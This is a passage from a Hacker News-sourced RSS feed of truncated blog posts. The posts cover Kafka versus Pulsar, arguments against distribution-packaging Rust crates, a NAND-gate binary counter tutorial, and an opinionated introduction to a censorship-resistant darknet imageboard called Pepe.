<h4 id="look-for-proof-points-beyond-tech-giants">Look for proof points beyond tech giants!</h4>
<p><b>Proof points beyond the tech giants are helpful to get insights and lessons learned from other people</b>. Not from the software vendors. The Kafka website gives many <a href="https://kafka.apache.org/powered-by">examples about mission-critical deployments</a>. Even more impressive: At the past<a href="https://kafka-summit.org/"> Kafka Summit</a> conferences in San Francisco, New York and London, every year various enterprises from different industries present their use cases and success stories. Including fortune 2000 companies, mid-size enterprises and startups.</p>
<p>Just to give you <b>one specific example in the Kafka world</b>: Various different implementations exist for replication of data in real time between separate Kafka clusters, including MirrorMaker 1 (part of the Apache Kafka project), MirrorMaker 2 (part of the Apache Kafka project), Confluent Replicator (built by Confluent and only available as part of Confluent Platform or Confluent Cloud), uReplicator (open sourced by Uber), Mirus (open sourced by Salesforce), Brooklin (open sourced by LinkedIn).</p>
<p>In practice, only two options are reasonable if you don’t want to maintain and improve the code by yourself: MirrorMaker 2 (very new, not mature yet, but a great option mid and long term) and Confluent Replicator (battle-tested in many mission-critical deployments, but not open source). All the other options work, too. But who maintains the projects? Who solves bugs and security issues? Who do you call when you have a problem in production? Deployment in production for mission-critical deployments is different from evaluating and trying out an open source project.</p>
<h3 id="myth-3-pulsar-provides-message-queuing-and-event-streaming-in-a-single-solution">Myth 3: “Pulsar provides message queuing and event streaming in a single solution”?</h3>
<p><b>Partly.</b></p>
<p>Message queues are used for point-to-point communication. They provide an asynchronous communications protocol, meaning that the sender and receiver of the message do not need to interact with the message queue at the same time.d</p>
<p><strong>Pulsar has only</strong> <b data-stringify-type="bold">limited support for message queuing, and limited support for event streaming</b>. If it wants to compete in either area, it still has a long way to go for two reasons:</p>
<p><b data-stringify-type="bold">1) Pulsar has only limited support for message queuing</b> because it misses popular messaging features like message XA transactions, routing, message filtering, etc. that are commonly used with messaging systems like IBM MQ, RabbitMQ, and ActiveMQ. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kai-waehner.de/blog/2020/06/09/apache-kafka-versus-apache-pulsar-event-streaming-comparison-features-myths-explored/">https://www.kai-waehner.de/blog/2020/06/09/apache-kafka-versus-apache-pulsar-event-streaming-comparison-features-myths-explored/</a></em></p>]]>
            </description>
            <link>https://www.kai-waehner.de/blog/2020/06/09/apache-kafka-versus-apache-pulsar-event-streaming-comparison-features-myths-explored/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26220404</guid>
            <pubDate>Mon, 22 Feb 2021 03:09:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Against Packaging Rust Crates]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26220147">thread link</a>) | @lifthrasiir
<br/>
February 21, 2021 | https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html | <a href="https://web.archive.org/web/*/https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="against-packaging-rust-crates">

<p>Recently the discussion has once again come up around the notion of packaging Rust crates as
libraries in distributions. For example, taking a library like <cite>serde</cite> and packaging it to
an RPM. While I use RPM as the examples here it applies equally to other formats.</p>
<p>Proponents of crate packaging want all Rust applications to use the “distributions” versions of a crate.
This is to prevent “vendoring” or “bundling”. This is where an
application (such as 389 Directory Server) ships all of it’s sources, as well as the sources of
it’s Rust dependencies in a single archive. These sources may differ in version from the bundled
sources of other applications.</p>
<div id="packaging-crates-is-not-reinventing-cargo">
<h2>“Packaging crates is not reinventing Cargo”</h2>
<p>This is a common claim by advocates of crate packaging. However it is easily disproved:</p>
<p><em>If packaging is not reinventing cargo, I am free to use all of Cargo’s features without conflicts to distribution packaging.</em></p>
<p>The reality is that packaging crates <em>is</em> reinventing Cargo - but without all it’s features. Common
limitations are that Cargo’s exact version/less than requirements can not be used safely, or Cargo’s ability to
apply patches or uses sources from specific git revisions can not be used at all.</p>
<p>As a result, this hinders upstreams from using all the rich features within Cargo to comply with
distribution packaging limitations, or it will cause the package to hit exceptions in policy and
necesitate vendoring anyway.</p>
</div>
<div id="you-can-vendor-only-in-these-exceptional-cases">
<h2>“You can vendor only in these exceptional cases …”</h2>
<p>As noted, since packaging is reinventing Cargo, if you use features of Cargo that are unsupported
then you may be allowed to vendor depending on the distributions policy. However, this raises some
interesting issues itself.</p>
<p>Assume I have been using distribution crates for a period of time - then the upstream adds an exact version
or git revision requirement to a project or a dependency in my project. I now need to change my spec file and tooling to use vendoring
and all of the benefits of distribution crates no longer exists (because you can not have any dependency
in your tree that has an exact version rule).</p>
<p>If the upstream ‘un-does’ that change, then I need to roll back to distribution crates since
the project would no longer be covered by the exemption.</p>
<p>This will create review delays and large amounts of administrative overhead. It means pointless effort to swap between
vendored and distribution crates based on small upstream changes. This may cause packagers to avoid
certain versions or updates so that they do not need to swap between distribution methods.</p>
<p>It’s very likely that these “exceptional” cases will be very common, meaning that vendoring will be occuring.
This necesitates supporting vendored applications in distribution packages.</p>
</div>
<div id="you-don-t-need-to-package-the-universe">
<h2>“You don’t need to package the universe”</h2>
<p>Many proponents say that they have “already packaged most things”. For example in 389 Directory Server
of our 60 dependencies, only 2 were missing in Fedora (2021-02). However this overlooks the fact
that I do not want to package those 2 other crates just to move forward. I want to support 389 Directory Server
the <em>application</em> not all of it’s dependencies in a distribution.</p>
<p>This is also before we come to larger rust projects, such as Kanidm that has nearly 400 dependencies. The
likelihood that many of them are missing is high.</p>
<p>So you will need to package the universe. Maybe not all of it. But still a lot of it. It’s already
hard enough to contribute packages to a distribution. It becomes even harder when I need to submit 3, 10, or 100
more packages. It could be months before enough approvals were in place. It’s a staggering
amount of administration and work, which will discourage many contributors.</p>
<p>People have already contacted me to say that if they had to package crates to distribution packages to
contribute, they would give up and walk away. We’ve already lost future contributors.</p>
<p>Further to this Ruby, Python and many other languages today all recommend language native tools
such as rvm or virtualenv to avoid using distribution packaged libraries.</p>
<p>Packages in distributions should exist as a vehicle to ship bundled applications that are created
from their language native tools.</p>
</div>
<div id="we-will-update-your-dependencies-for-you">
<h2>“We will update your dependencies for you”</h2>
<p>A supposed benefit is that versions of crates in distributions will be updated in the background
according to semver rules.</p>
<p>If we had an exact version requirement (that was satisfiable), a silent background update will cause
this to no longer work - and will break the application from building. This would necesitate one of:</p>
<ul>
<li>A change to the Cargo.toml to remove the equality requirement - a requirement that may exist for good reason.</li>
<li>It will force the application to temporarily swap to vendoring instead.</li>
<li>The application will remain broken and unable to be updated until upstream resolves the need for the equality requirement.</li>
</ul>
<p>Background updates also ignore the state of your Cargo.lock file by removing it. A Cargo.lock file
is recommended to be checked in with binary applications in Rust, as evidence that shows “here is
an exact set of dependencies that upstream has tested and verified as building and working”.</p>
<p>To remove and ignore this file, means to remove the guarantees of quality from an upstream.</p>
<p>It is unlikely that packagers will run the entire test suite of an application to regain this
confidence. They will “apply the patch and pray” method - as they already do with other languages.</p>
<p>We can already see how background updates can have significant negative consequences on application stability. FreeIPA
has hundreds of dependencies, and it’s common that if any of them changes in small ways, it can cause
FreeIPA to fall over. This is not the fault of FreeIPA - it’s the fault of relying on so many small
moving parts that can change underneath your feet without warning. FreeIPA would strongly benefit from
vendoring to improve it’s stability and quality.</p>
<p>Inversely, it can cause hesitation to updating libraries - since there is now a risk of breaking
other applications that depend on them. We do not want people to be afraid of updates.</p>
</div>
<div id="we-can-respond-to-security-issues">
<h2>“We can respond to security issues”</h2>
<p>On the surface this is a strong argument, but in reality it does not hold up. The security issues
that face Rust are significantly different to that which affect C. In C it may be viable to patch
and update a dynamic library to fix an issue. It saves time because you only need to update and change
one library to fix everything.</p>
<p>Security issues are much rarer in Rust. When they occur, you will have to update and re-build all
applications depending on the affected library.</p>
<p>Since this rebuilding work has to occur, where the security fix is applied is irrelevant. This frees
us to apply the fixes in a different way to how we approach C.</p>
<p>It is better to apply the fixes in a consistent and universal manner. There <em>will</em> be applications
that are vendored due to vendoring exceptions, there is now duplicated work and different
processes to respond to both distribution crates, and vendored applications.</p>
<p>Instead all applications could be vendored, and tooling exists that would examine the Cargo.toml to
check for insecure versions (RustSec/cargo-audit does this for example). The Cargo.toml’s can be
patched, and applications tested and re-vendored. Even better is these changes could easily then be forwarded to
upstreams, allowing every distribution and platform to benefit from the work.</p>
<p>In the cases that the upstream can not fix the issue, then Cargo’s native patching tooling can
be used to supply fixes directly into vendored sources for rare situations requiring it.</p>
</div>
<div id="patching-20-vulnerable-crates-doesn-t-scale-we-need-to-patch-in-one-place">
<h2>“Patching 20 vulnerable crates doesn’t scale, we need to patch in one place!”</h2>
<p>A common response to the previous section is that the above process won’t scale as we need to find
and patch 20 locations compared to just one. It will take “more human effort”.</p>
<p>Today, when a security fix comes out, every distribution’s security teams will have to be made aware of
this. That means - OpenSUSE, Fedora, Debian, Ubuntu, Gentoo, Arch, and many more groups all have to
become aware and respond. Then each of these projects security teams will work with their maintainers
to build and update these libraries. In the case of SUSE and Red Hat this means that multiple developers
may be involved, quality engineering will be engaged to test these changes. Consumers of that library
will re-test their applications in some cases to ensure there are no faults of the components they
rely upon. This is all before we approach the fact that each of these distributions have many supported
and released versions they likely need to maintain so this process may be repeated for patching and
testing multiple versions in parallel.</p>
<p>In this process there are a few things to note:</p>
<ul>
<li>There is a huge amount of human effort today to keep on top of security issues in our distributions.</li>
<li>Distributions tend to be isolated and can’t share the work to resolve these - the changes to the rpm specs in SUSE won’t help Debian for example.</li>
<li>Human error occurs in all of these layers causing security issues to go un-fixed or breaking a released application.</li>
</ul>
<p>To suggest that rust and vendoring somehow makes this harder or more time consuming is discounting
the huge amount of time, skill, and effort already put in by people to keep our C based distributions functioning
today.</p>
<p>Vendored Rust won’t make this process easier or harder - it just changes the nature of the effort
we have to apply as maintainers and distributions. It shifts our focus from “how do we ensure this
library is secure” to “how do we ensure this <em>application</em> made from many libraries is secure”. It
allows further collaboration with upstreams to be involved in the security update process, which ends up
benefiting <em>all</em> distributions.</p>
</div>
<div id="it-doesn-t-duplicate-effort">
<h2>“It doesn’t duplicate effort”</h2>
<p>It does. By the very nature of both distribution libraries and vendored applications needing to
exist in a distribution, there will become duplicated but seperate processes and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html">https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html</a></em></p>]]>
            </description>
            <link>https://fy.blackhats.net.au/blog/html/2021/02/16/against_packaging_rust_crates.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26220147</guid>
            <pubDate>Mon, 22 Feb 2021 02:38:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Building a Binary Counter]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26219601">thread link</a>) | @lowdanie
<br/>
February 21, 2021 | https://www.daniellowengrub.com/blog/2021/02/08/binary-counter | <a href="https://web.archive.org/web/*/https://www.daniellowengrub.com/blog/2021/02/08/binary-counter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p>A binary counter is an electronic component that records the number of times it has received a pulse. It is called <em>binary</em> because it stores the number in its binary representation. Counters are absolutely ubiquitous in electronics and can be used to make circuits ranging from memory chips to FM radio decoders.</p>

<p>Since counters are so useful, I thought it would be fun to implement one using only basic logic gates like NAND and OR. As a practical application, I hooked up a 1-bit counter to a clock and a pair of LEDs to create a random bit generator:</p>

<p><img src="https://www.daniellowengrub.com/assets/binary_counter/random_breadboard.jpeg" alt="Random Generator"></p>

<p>The output of the counter is connected to two LEDs. One of them lights up when the counter is in the 0 state and the other lights up in the 1 state. When the button is pressed down, the clock starts sending out around 100 pulses per second causing the counter to oscillate between 0 and 1. When the button is released the timer stops and the the counter remains in its most recent state as indicated by the corresponding LED. The state is maintained until the next time the button is pressed.</p>

<p>Since the oscillations are very fast relative to human reflexes, the LED that remains lit after each button release appears to be chosen randomly with each LED appearing with equal probability. In other words, one can think of this circuit as simulating a coin flip where one of the LEDs represents heads and the other tails. At the end of the post I will provide some evidence that two outcomes are indeed equally likely.</p>

<p>The primary goal of this post is to explain how to make a 1 bit counter out of basic logic gates. After that weâ€™ll get into the details of the complete random bit generator circuit shown above. Weâ€™ll conclude by showing how multiple 1 bit counters can easily be chained together to produce larger counters such as the useful 8 bit counter.</p>


<p>Here is a high level schematic of the one bit binary counter we want to build:</p>

<p><img src="https://www.daniellowengrub.com/assets/binary_counter/one_bit_counter.png" alt="One Bit Counter"></p>

<p>We now turn to the design requirements.</p>

<p>The counter has a single input which is labelled â€œClockâ€� and two outputs labelled $Q$ and $\overline{Q}$. The input and output wires can either have a â€œhighâ€� voltage or a â€œlowâ€� voltage. In our case, we will be using a 5 volt power supply so a â€œhighâ€� wire will be close to 5 volts and a â€œlowâ€� wire will be close to 0 volts.</p>

<p>The overline on the bottom output represents the fact that its state is always opposite to $Q$. I.e, if $Q$ is high then $\overline{Q}$ is low and vice versa. It may seem redundant to include both $Q$ and $\overline{Q}$ but later we will see why it is useful. We summarize the state of the counter by writing $Q=1$ if $Q$ is high and $Q=0$ if $Q$ is low.</p>

<p>As long as the clock input is low the output state should remain fixed. But each time the the clock receives a pulse (explained below) the values of the outputs should flip.</p>

<p>In more detail, a â€œpulseâ€� means that the clock input rises from low to high, and then quickly falls back to low. Since the output should only change one time per pulse, we would like the outputs to flip whenever the clock input <em>rises</em> from low to high. This special behavior is indicated by the triangle next to the clock input.</p>

<p>You may be wondering why we need this fancy pulse behavior. Why canâ€™t we simply demand that the outputs flip whenever the input is high? The issue with that design is that every pulse has some non-zero duration. So even a short pulse would cause the outputs to start rapidly flipping back and forth from the moment the clock input went high until the end of the pulse when it went low again. This would make the final state undefined!</p>

<p>In contrast, the input voltage rises from low to high exactly once per pulse so our design guarantees that the outputs will flip exactly once whenever the input receives a pulse.</p>

<p>Now that weâ€™ve specified the counterâ€™s behavior we turn to the implementation.</p>

<p>There are two main implementation challenges. First, how does the counter maintain its state between pulses? Second of all, how is it possible to detect the low to high transition exactly once per pulse?</p>

<p>In the next section we focus on the first issue by considering a simpler type of component that has two separate â€œonâ€� and â€œoffâ€� inputs rather than the complex clock input. We will then solve the pulse problem by chaining two of these simpler components to each other!</p>

<h2 id="the-sr-flip-flop">The SR Flip-flop</h2>
<p>In this section weâ€™ll build a component called the <a href="https://en.wikipedia.org/wiki/Flip-flop_(electronics)#Simple_set-reset_latches">Set Reset Flip-flop</a> or <em>SR Flip-flop</em> for short.</p>

<p>Here is a diagram of the SR flip-flop:
<img src="https://www.daniellowengrub.com/assets/binary_counter/sr_flipflop.png" alt="SR Flip-flop"></p>

<p>This flip-flop has two inputs: $S$ (â€œsetâ€�) and $R$ (â€œresetâ€�) and two outputs: $Q$ and $\overline{Q}$. As before, $\overline{Q}$ always has the opposite value of $Q$. So if $Q$ is high then $\overline{Q}$ is low and vice versa.</p>

<p>In its default state, both inputs $S$ and $R$ are high and the output $Q$ is low. If $S$ is pulled low (i.e $S=0$) this <em>sets</em> the gate and causes the output $Q$ to be high (and therefore $\overline{Q}$ to be low). The output will stay in this state even when $S$ goes high again. On the other hand, pulling $R$ low <em>resets</em> the gate which means that $Q$ will go low. As before, $Q$ will remain low even when $R$ goes back to being high.</p>

<p>In summary, we can flip between the two possible output states by lowering either $S$ or $R$. Furthermore, the SR flip-flop maintains its state until the next set or reset operation.</p>

<p>It turns out that it is possible to build an SR latch out of just two <a href="https://en.wikipedia.org/wiki/NAND_gate">NAND gates</a> via an ingenious mechanism called the <a href="https://en.wikipedia.org/wiki/Flip-flop_(electronics)#SR_NAND_latch">NAND latch</a> as shown in the following diagram:</p>

<p><img src="https://www.daniellowengrub.com/assets/binary_counter/nand_latch_circuit.png" alt="NAND Latch"></p>

<p>We are using the convention that an â€œXâ€� intersection of wires means that the wires do not touch but rather cross over each other.</p>

<p>How does this circuit work? Lets see what happens if we start in the defaults state ($S=R=\overline{Q}=1$, $Q=0$) and perform a <em>set</em> operation:</p>

<p><img src="https://www.daniellowengrub.com/assets/binary_counter/nand_latch_states.png" alt="NAND Latch"></p>

<p>In the initial state the input to the top NAND is $(1, 1)$ and so its output is $Q=0$. The input to the bottom NAND is $(0, 1)$ so its output is $\overline{Q}=1$. Since everything is consistent, the gates will stay in this configuration until we change one of the the inputs.</p>

<p>Now lets perform a â€œsetâ€� operation by pulling down $S$ to a low state to get $S=0$. Since one of the inputs to the top NAND is $0$, its output will be $Q=1$ regardless of the other input. This means that the input to the bottom NAND is $(1, 1)$ causing its output to be $\overline{Q}=0$.</p>

<p>Finally, lets see what happens if we release $S$ and let it go back to the default high state $S=1$. The input to the top NAND is now $(1, 0)$ which means that its output is still $Q=1$. Therefore the output to the bottom NAND is still $(1, 1)$ causing its output to stay at $\overline{Q}=0$.</p>

<p>In summary, we can see that one cycle of $S=0 \Rightarrow S=1$ <em>sets</em> the output to $Q=1,\,\overline{Q}=0$. A similar analysis shows that a cycle of $R=0 \Rightarrow R=1$ <em>resets</em> the output to $Q=0,\,\overline{Q}=1$.</p>

<h2 id="a-1-bit-counter-implementation">A 1-Bit Counter Implementation</h2>
<p>We now return to the problem of building a one bit counter. The SR flip-flop from the last section gets us pretty close: It has the outputs $Q$ and $\overline{Q}$ and allows us to toggle between them by pulling down $S$ or $R$. To turn this into a counter we need to replace the set/reset inputs with a single <em>clock</em> input.</p>

<p>The general logic should be:</p>
<ul>
  <li>If the clock is low then then the SR inputs should be in their default state of $S=R=1$. This will result in $Q$ maintaining its current state.</li>
  <li>If the clock is high and $Q=1$, <em>reset</em> the SR flip-flop by setting $R=0$. This will result in $Q=0$.</li>
  <li>If the clock is high and $Q=0$, <em>set</em> the SR flip-flop by setting $S=0$. This will result in $Q=1$.</li>
</ul>

<p>We can implement this logic by wiring up an SR flip-flop with two NAND gates like so:</p>

<p><img src="https://www.daniellowengrub.com/assets/binary_counter/one_bit_circuit_simple.png" alt="One Bit Counter Circuit"></p>

<p>As before, wires that meet in an X intersection do not touch each other. Weâ€™ve connected the $Q$ output to the bottom NAND and the $\overline{Q}$ output to the top NAND.</p>

<p>Letâ€™s verify that this circuit follows the logic outlined above. Indeed, if $\mathrm{Clock}=0$ then both of the NANDs will have a $0$ input and so their outputs will always both be $1$. This means that the two inputs to the SR flip-flop will be in their default $1$ state as desired.</p>

<p>What happens when the clock goes high ($\mathrm{Clock}=1$)? Suppose that $Q=1,\,\overline{Q}=0$. Then the inputs to the top NAND will be $(\overline{Q}=0, \mathrm{Clock}=1)$ and so its output will be $1$. On the other hand, the inputs to the bottom NAND will be $(\mathrm{Clock}=1, Q=1)$ so its output will be $0$. Together this means that the input to the SR flip-flop will be $S=1$, $R=0$ which by definition will <em>reset</em> the flip-flop to $Q=0,\,\overline{Q}=1$.</p>

<p>If the clock goes high again it is not hard to see that the SR inputs will now be $(S=0,\,R=1)$ causing it to <em>set</em> the output back to $Q=0,\,\overline{Q}=1$.</p>

<p>The only problem with this setup is that the outputs will keep flipping as long as the clock is high! Since each clock pulse has some non-zero duration, this version of the counter will flip many times per pulse rather than just once.</p>

<p>The solution is to use <em>two</em> SR flip-flops. One will record the current output and the other will record the output for the next pulse. The trick is that the â€œcurrentâ€� flip-flop is activated when the clock goes high as above, but the â€œnextâ€� flip-flop will be activated when the clock goes low. The effect is that the counter is only updated after a complete cycle $\mathrm{Clock}=0 \Rightarrow \mathrm{Clock}=1$, preventing the oscillations in our first version.</p>

<p>Here is an implementation of this idea:</p>

<p><img src="https://www.daniellowengrub.com/assets/binary_counter/one_bit_circuit.png" alt="One Bit Counter Circuit"></p>

<p>When the clock is <em>low</em> it is easy to see that $S_{cur}=R_{cur}=1$ meaning that the â€œcurrentâ€� flip-flop will not be updated. In contrast, when the clock is <em>high</em> $S_{next}=R_{next}=1$ and so the â€œnextâ€� clock will not be updated. It is not hard to verify that with this version the outputs $Q,\,\overline{Q}$ flip exactly once when the clock receives a pulse.</p>


<p>In this section we will use a 1 bit counter to build the random bit generator we described in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.daniellowengrub.com/blog/2021/02/08/binary-counter">https://www.daniellowengrub.com/blog/2021/02/08/binary-counter</a></em></p>]]>
            </description>
            <link>https://www.daniellowengrub.com/blog/2021/02/08/binary-counter</link>
            <guid isPermaLink="false">hacker-news-small-sites-26219601</guid>
            <pubDate>Mon, 22 Feb 2021 01:33:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Frustrated with Parler deplatforming, I am building a service no one can silence]]>
            </title>
            <description>
<![CDATA[
Score 110 | Comments 190 (<a href="https://news.ycombinator.com/item?id=26218900">thread link</a>) | @anon20190221
<br/>
February 21, 2021 | https://1b677b8f8bb20100.github.io/introduction/ | <a href="https://web.archive.org/web/*/https://1b677b8f8bb20100.github.io/introduction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      

      

<p>This is the first post in this blog, it was published on February 19, 2021.</p>

<h2 id="motivation">Motivation</h2>

<h3 id="censorship">Censorship</h3>

<p>The year of 2020 will be remembered for the pandemic, the BLM movement, and the U.S. elections among other billion of things around the globe. It is funny I even mention the third one considering how little I give a damn about U.S. politics, yet this whole story begins with <a href="https://en.wikipedia.org/wiki/Parler">Parler</a> deplatforming that happened about a month ago. Let me remind you: Apple, Google, Amazon, and a few other companies terminated their service to the free speech social network for insufficient moderation effectively destroying the platform in a matter of just a couple of days. What the fuck?</p>

<p>OK, let me be clear with my position: I believe every private company has a right to refuse service to anyone, whether an individual or a business, but I also have my own right to despise them for exercising that. What they did was probably legal, but screw them anyway, they failed us. Regardless what these psychopathic corporations like to tell the public, they are only concerned with maximizing shareholder value, and if there is anything  even remotely resembling an image liability (through pressure by political radicals, cancel culture SJWs, you name it), they will not think twice. What disgusts me the most here is neither greed nor hypocrisy but their unwillingness to grow a pair of balls and stand up for freedom of speech.</p>

<p>You see, freedom of speech and expression must be absolute. You cannot have censorship-resistance with exceptions; otherwise, these exceptions could be used to remove or block anything unwanted, not only offensive. This way, the Chinese cannot access Wikipedia because of what originally started as a counter-terrorism measure, and the Russians cannot access LinkedIn because of what originally started as a children protection measure. We cannot deprive humanity of their freedom just because some small fraction of users might, unfortunately, use that freedom to spread offensive content. In the same way, you do not ban electricity because people get electrocuted.</p>

<p>Let us now switch from corporates to governments. Ooh, wee! Do not even get me started on that. And I am not even talking about cases like Google happily not letting people disable <a href="https://en.wikipedia.org/wiki/SafeSearch">SafeSearch</a> in Indonesia because its government knows best, that is just the tip of the iceberg. I am talking about political censorship which includes silencing people with torture, gulags, and bullets. Here is the world map of the freedom of the press status:</p>

<p><img src="https://1b677b8f8bb20100.github.io/introduction/press-freedom.png" alt="2020 Press Freedom Index"></p>

<p>Just look at this mess. Blue tones mean OK-ish, others not so much. This map is <a href="https://de.wikipedia.org/wiki/User:NordNordWest">NordNordWest</a>’s work based on the <a href="https://rsf.org/en/ranking">2020 Press Freedom Index</a> and is distributed under <a href="https://creativecommons.org/licenses/by-sa/3.0/de/legalcode">CC BY-SA 3.0 de</a>. Keep in mind population densities, e.g. there are about 90 times more people per unit area living in Vietnam than Australia. I am actually surprised the U.S. did so well in 2020 considering how badly they wanted <a href="https://en.wikipedia.org/wiki/Julian_Assange">Mr. Assange</a> to be extradited and executed.</p>

<p>What would you answer your children if they asked you how in the world North Korea still exists in its current form with 25 million Koreans suffering for over 70 years and no one is doing anything about that? Or how about 28 million people in Venezuela? Or 82 million people in Iran? Giving voice to all whistleblowers and activists, especially the ones risking their lives and freedom in hostile environments is the fundamental goal of Pepe.</p>

<h3 id="darknets">Darknets</h3>

<p>There is already <a href="https://en.wikipedia.org/wiki/Tor_(anonymity_network)">Tor</a>, <a href="https://en.wikipedia.org/wiki/I2P">I2P</a>, <a href="https://en.wikipedia.org/wiki/Freenet">Freenet</a>, <a href="https://en.wikipedia.org/wiki/GNUnet">GNUnet</a> etc. We can run emails, message boards, <a href="https://en.wikipedia.org/wiki/BitTorrent">BitTorrent</a>, <a href="https://en.wikipedia.org/wiki/Kad_network">Kad</a>, and <a href="https://en.wikipedia.org/wiki/InterPlanetary_File_System">IPFS</a> on top of them, maybe even use <a href="https://en.wikipedia.org/wiki/Ethereum">Ethereum</a> smart contracts for decentralized computing. All the technology is there, why bother with something new? Well, first of all, these are all amazing projects, there is nothing wrong with them. The peculiar thing, however, is none of them except BitTorrent (and perhaps Tor) gained much popularity, neither do we see any readily available censorship-resistant communication platforms. Why is that?</p>

<p>I claim there are 2 main reasons for that:</p>

<ul>
  <li>
    <p>They are hard to use. The “Unix is user-friendly, it is just picky about who its friends are.” aphorism still lives in most them: you may need to install a bunch of additional software (such as <a href="https://en.wikipedia.org/wiki/Java_virtual_machine">JVM</a> or shared libraries) potentially dealing with a dependency hell on some platforms; read through sparse documentation and dead forums on optimal network, security, and sharing settings; carefully configure your router, computer, and client; install, study, and configure applications running on top of the darknet, i.e. repeat the steps. The reason why Tor became popular outside of research was not because it was first, but because of the hacky all-in-one Tor Browser Bundle with sane defaults.</p>
  </li>
  <li>
    <p>They prefer purity to practicality. Instead of concentrating manpower on few specific use cases, most existing tools try to conquer the world: a new internet, interplanetary, infrastructure, an application framework, APIs, a Turing-complete language on the blockchain etc. This is great and all, it is general, conceptual, modular, extensible, and stackable—everything we like—but sometimes overengineering is just overengineering given the goal. And our goal here is not to make a technical revolution, but to help as many people as we can communicate without fear of retribution.</p>
  </li>
</ul>

<p>BitTorrent evolved into something that is used by 150 million people worldwide, it seamlessly adopted <a href="https://en.wikipedia.org/wiki/Distributed_hash_table">DHT</a>, <a href="https://en.wikipedia.org/wiki/Peer_exchange">PEX</a>, <a href="https://en.wikipedia.org/wiki/Micro_Transport_Protocol">µTP</a>, trackerless <a href="https://en.wikipedia.org/wiki/Magnet_URI_scheme">magnet links</a>, and people do not even know what the hell it all means. Even though proprietary, <a href="https://en.wikipedia.org/wiki/Skype">Skype</a> thrived very similarly (at least before it was crippled by Microsoft), millions of its users did not even know what peer-to-peer meant, not to mention how it worked under the hood, it just did. These two systems succeeded not because of luck but rather as a result of some excellent product decisions. We need to learn from that and reiterate.</p>

<h2 id="pepe-overview">Pepe overview</h2>

<h3 id="user-level">User level</h3>

<p>For the messaging platform, I chose to use an <a href="https://en.wikipedia.org/wiki/Imageboard">imageboard</a> similar to <a href="https://en.wikipedia.org/wiki/4chan">4chan</a> or <a href="https://en.wikipedia.org/wiki/Futaba_Channel">Futaba Channel</a>. While not the most popular type of forum, imageboards are extremely flexible and free of junk like authentication or karma, they promote anonymity in a very practical way, and over 30 million people are already familiar with them. Perhaps, I am not a big fan of their crowded old-school design, but the initial user traction is more important than my sense of beauty, we will refine the looks through time.</p>

<p>That is, the Pepe imageboard is going to be the only application running on top the Pepe darknet, they are in fact inseparable. This way, we can design the network specifically for this one use case. This brings both security and performance benefits. Joining the darknet can be as simple as double clicking the application, and users do not need to install or configure any third-party browsers or proxy servers, they can just go to <a href="http://localhost:8666/">localhost:8666</a> using Chrome, Safari, or whatever they like, and it is going to be safe without any third-party extensions.</p>

<p>Once online, users may browse existing or create new message boards about various topics in any language such as <code>/en/food/</code> or <code>/ja/math/</code>. A board is a collection of threads about something more specific, would it be an idea or a question. A thread has a collection of posts that people send replying to each other. Each post may have one or multiple attachments such as photos, videos, you name it. So that you have an idea of what it looks like, here is a screenshot of a random thread on the 4chan DIY board:</p>

<p><img src="https://1b677b8f8bb20100.github.io/introduction/4chan-thread.png" alt="4chan thread"></p>

<p>What is fundamentally different with Pepe is moderation. Instead of relying on a centralized entity with a banhammer, each board and thread owner may anonymously moderate their spaces on their own. However, nothing can actually be deleted, it can only be shadowed, and each user decides whether they want to see the light or the full version of the page at any moment in time. People can still reply to shadowed posts inside their own shadowed posts, so no one cannot silence anyone, only maintain order on the light side.</p>

<p>If people are no longer interested in particular threads, they will eventually become forgotten by the network and naturally disappear from their board. But if there is at least one person who is subscribed to or has archived some thread, no one in the world (even Pepe creators) can censor or somehow shut it down without hurting most of the network Pepe is running on top of.</p>

<h3 id="network-level">Network level</h3>

<p>The three biggest problems with 4chan and similar communication platforms are:</p>

<ul>
  <li>They use closed source software so no one can tell how secure everything is and what is really going on there.</li>
  <li>They are centralized, i.e. some individual or business owns the servers and fully controls the whole infrastructure.</li>
  <li>They collect lots of metadata including but not limited to “someone with this <a href="https://en.wikipedia.org/wiki/IP_address">IP address</a> posted this at this moment in time”.</li>
</ul>

<p>Mitigating the first problem is the easiest: just use open-source software whenever possible. Regarding the centralization issue, we could switch to a decentralized solution like BitTorrent (imagine each torrent containing a thread with its posts and attachments), but that itself does not help with privacy, people can still see what others are doing. Similarly, we could tackle the privacy issue with a <a href="https://en.wikipedia.org/wiki/Virtual_private_network">VPN</a> or a darknet like Tor or I2P, but that, contrary to popular belief, does not solve the centralization issue in any way. Clearly, we need the best of the two worlds. Let us fuse them together!</p>

<p><img src="https://1b677b8f8bb20100.github.io/introduction/pepe-routing.png" alt="Pepe routing"></p>

<p>Here is an very simplified walk through how the network works. Imagine Bob is an undercover journalist who wants to anonymously share his report and Alice is a political activist who is interested in the investigation Bob had been doing. It all starts with Bob announcing he has the report:</p>

<ol>
  <li>
    <p>Bob joins the network and gathers information about random peers on it through the <a href="https://en.wikipedia.org/wiki/Distributed_hash_table">DHT</a>. This way, Bob discovers hundreds of participants including X and Y. Similarly, Bob registers himself on the network through the DHT so that others …</p></li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://1b677b8f8bb20100.github.io/introduction/">https://1b677b8f8bb20100.github.io/introduction/</a></em></p>]]>
            </description>
